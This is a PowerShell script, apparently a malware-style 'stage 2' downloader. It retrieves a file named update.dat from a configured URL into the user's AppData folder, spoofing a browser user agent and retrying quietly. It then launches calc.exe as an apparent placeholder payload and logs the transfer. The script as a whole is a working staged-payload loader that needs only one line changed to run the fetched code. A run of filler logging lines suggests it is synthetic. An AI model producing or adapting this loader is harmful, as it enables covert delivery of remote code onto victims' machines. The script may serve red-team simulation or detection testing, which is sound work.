
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://internal.corp:443/assets/update.dat',
    [string]$WorkingPath = "$env:APPDATA\update.dat",
    [string]$ActivityLog = "$env:TEMP\transfer.log",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TimeoutSec = 108,
    [int]$RetryAttempts = 5,
    [int]$RetryDelay = 15
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 5,
        [int]$RetryDelay = 15,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage2Url
    $OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $WorkingPath -RetryCount $RetryAttempts -RetryDelay $RetryDelay -UserAgent $RequestAgent
    if ($OperationResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage2Url
    Destination = $WorkingPath
    RetryCount = $RetryAttempts
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Checking local path"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
